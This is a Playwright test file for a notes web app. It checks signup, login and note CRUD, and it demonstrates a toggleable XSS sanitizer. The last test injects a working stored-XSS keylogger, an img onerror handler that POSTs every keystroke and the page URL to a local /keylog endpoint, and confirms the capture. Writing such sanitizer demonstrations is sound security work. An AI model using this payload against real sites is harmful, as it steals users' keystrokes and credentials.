import { test, expect } from "@playwright/test";

const baseURL = "http://localhost:3000/";

const login = async ({ page }) => {
	await page.click('button[data-testid="go_to_login_button"]');
	await page.fill('input[name="Username"]', "test");
	await page.fill('input[name="Password"]', "test");
	await page.click('button[type="submit"]');
};

test.describe("CRUD Tests", () => {
	test.beforeEach(async ({ page }) => {
		await page.goto(baseURL);
	});

	test("signup: Can sign up with valid credentials", async ({ page }) => {
		await page.goto(baseURL + "create-user");
		await page.fill(
			'input[name="Username"]',
			"newuser" + Math.floor(Math.random() * 1000)
		); // Randomize username to avoid conflicts
		await page.fill('input[name="Password"]', "newpassword");
		await page.fill('input[name="Name"]', "Blasdwdw");
		await page.fill('input[name="Email"]', "eedxde@gmail.com");
		await page.click('button[type="submit"]');
		await expect(page).toHaveURL(`${baseURL}`);
	});

	test("Login: Can log in with valid credentials", async ({ page }) => {
		await login({ page });
		// Check if redirected to home page
		await expect(page).toHaveURL(`${baseURL}`);
	});

	test("Create: Can add a new note", async ({ page }) => {
		await login({ page });
		const firstNoteOldId = await page
			.locator(".note")
			.first()
			.getAttribute("data-testid");
		const text = "This is a new note from Playwright";
		await page.click('button[name="add_new_note"]');
		const input = page.locator('textarea[name="text_input_new_note"]');
		await input.fill(text);

		await page.click('button[name="text_input_save_new_note"]');
		await page.waitForFunction((oldId) => {
			const first = document.querySelector(".note");
			return first && first.getAttribute("data-testid") !== oldId;
		}, firstNoteOldId);

		const firstNoteNewId = await page
			.locator(".note")
			.first()
			.getAttribute("data-testid");
		expect(firstNoteNewId).not.toBe(firstNoteOldId);
	});

	test("Read: Notes list displays at least one note", async ({ page }) => {
		const noteItems = page.locator("text=Note");
		await expect(noteItems.first()).toBeVisible();
	});

	test("Update: Can edit the first note", async ({ page }) => {
		await login({ page });
		const firstNote = page.locator(".note").first();
		const noteId = await firstNote.getAttribute("data-testid");
		const newContent = "Edited note content from Playwright";

		await page.click(`[data-testid="edit-${noteId}"]`);

		const textarea = page.locator(`[data-testid="text_input-${noteId}"]`);
		await textarea.fill(newContent);

		await page.click(`[data-testid="text_input_save-${noteId}"]`);

		// Target the specific note container, not just any text on the page
		const updatedNote = page.locator(`[data-testid="${noteId}"]`);
		await expect(updatedNote).toContainText(newContent);
	});

	test("Delete: Can delete the first note", async ({ page }) => {
		await login({ page });
		const firstNote = page.locator(".note").first();
		const content = (await firstNote.textContent())?.trim();
		const noteId = await firstNote.getAttribute("data-testid");
		const before = await page.locator(`.note:has-text("${content}")`).count();

		const deleteButton = firstNote.locator(`[data-testid="delete-${noteId}"]`);
		await deleteButton.click();

		// Wait for the SPECIFIC note to be detached, not "the first note"
		await page
			.locator(`[data-testid="${noteId}"]`)
			.waitFor({ state: "detached", timeout: 5000 });

		const after = await page.locator(`.note:has-text("${content}")`).count();
		expect(after).toBe(before - 1);
	});

	test("Verify rich text rendering", async ({ page }) => {
		await login({ page });
		const text = "This is a new note from Playwright";
		const firstNoteOldId = await page
			.locator(".note")
			.first()
			.getAttribute("data-testid");
		await page.click('button[name="add_new_note"]');
		const input = page.locator('textarea[name="text_input_new_note"]');
		await input.fill(`<strong>${text}</strong>`);
		const richTextCheckbox = page.locator(
			'input[data-testid="rich_text_checkbox"]'
		);
		await richTextCheckbox.check();
		await page.click('button[name="text_input_save_new_note"]');
		await page.waitForFunction((oldId) => {
			const first = document.querySelector(".note");
			return first && first.getAttribute("data-testid") !== oldId;
		}, firstNoteOldId);
		const firstNoteNewId = await page
			.locator(".note")
			.first()
			.getAttribute("data-testid");
		const newNote = page.locator(`[data-testid="${firstNoteNewId}"]`);
		await expect(firstNoteNewId).not.toBe(firstNoteOldId);
		await expect(newNote.locator("strong")).toHaveText(text);
	});

	test("Demonstrate sanitizer blocks XSS when ON.", async ({ page }) => {
		await login({ page });
		const firstNoteOldId = await page
			.locator(".note")
			.first()
			.getAttribute("data-testid");
		await page.click('button[name="add_new_note"]');
		const input = page.locator('textarea[name="text_input_new_note"]');
		await input.fill(`<script>alert("hi")</script>`);
		const richTextCheckbox = page.locator(
			'input[data-testid="rich_text_checkbox"]'
		);
		await richTextCheckbox.check();
		await page.click('button[name="text_input_save_new_note"]');
		await page.waitForFunction((oldId) => {
			const first = document.querySelector(".note");
			return first && first.getAttribute("data-testid") !== oldId;
		}, firstNoteOldId);
		const firstNoteNewId = await page
			.locator(".note")
			.first()
			.getAttribute("data-testid");
		const newNote = page.locator(`[data-testid="${firstNoteNewId}"]`);
		expect(firstNoteNewId).not.toBe(firstNoteOldId);
		//check text is empty
		await expect(newNote.locator("div")).toHaveText("");
		const html = await newNote.locator("div").innerHTML();
		expect(html.trim()).toBe(""); // nothing rendered
	});

	test("Demonstrate XSS/keylogger works when sanitizer is OFF", async ({
		page,
	}) => {
		await login({ page });
		const text = `<img src="x" id="keylogger" onerror="
        let lastKey = '';
        let lastTime = 0;
        document.addEventListener('keydown', function(e) {
          const now = Date.now();
          // Only send if it's a different key or enough time has passed
          if (e.key !== lastKey || now - lastTime > 100) {
            fetch('http://localhost:3002/keylog', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({
                key: e.key,
                code: e.code,
                page: window.location.href,
                timestamp: now
              })
            }).catch(console.error);
            lastKey = e.key;
            lastTime = now;
          }
        });
        " style="display:none;" />`;
		const firstNoteOldId = await page
			.locator(".note")
			.first()
			.getAttribute("data-testid");
		// Turn off sanitizer
		const sanitizerCheckbox = page.locator(
			'input[data-testid="sanitizer_checkbox"]'
		);
		await sanitizerCheckbox.uncheck();
		await page.click('button[name="add_new_note"]');
		const input = page.locator('textarea[name="text_input_new_note"]');
		await input.fill(text);
		const richTextCheckbox = page.locator(
			'input[data-testid="rich_text_checkbox"]'
		);
		await richTextCheckbox.check();
		await page.click('button[name="text_input_save_new_note"]');
		await page.waitForFunction((oldId) => {
			const first = document.querySelector(".note");
			return first && first.getAttribute("data-testid") !== oldId;
		}, firstNoteOldId);
		const firstNoteNewId = await page
			.locator(".note")
			.first()
			.getAttribute("data-testid");
		const newNote = page.locator(`[data-testid="${firstNoteNewId}"]`);
		expect(firstNoteNewId).not.toBe(firstNoteOldId);
		//check text is empty
		await expect(newNote.locator("div img#keylogger")).toHaveCount(1);
	const hasOnError = await page.evaluate(() => {
  const el = document.querySelector("#keylogger");
  return el?.getAttribute("onerror") !== null;
});

		expect(hasOnError).toBe(true);
	  const keylogRequests: any[] = [];


    await page.route('**/keylog', route => {
    keylogRequests.push(route.request().postDataJSON());
    route.fulfill({ status: 200, body: 'OK' });
  })
  await page.keyboard.press('a');
  await page.keyboard.press('b');
  await page.keyboard.press('c');
  await page.waitForTimeout(200);
  expect(keylogRequests.length).toBeGreaterThanOrEqual(3);

	});
});
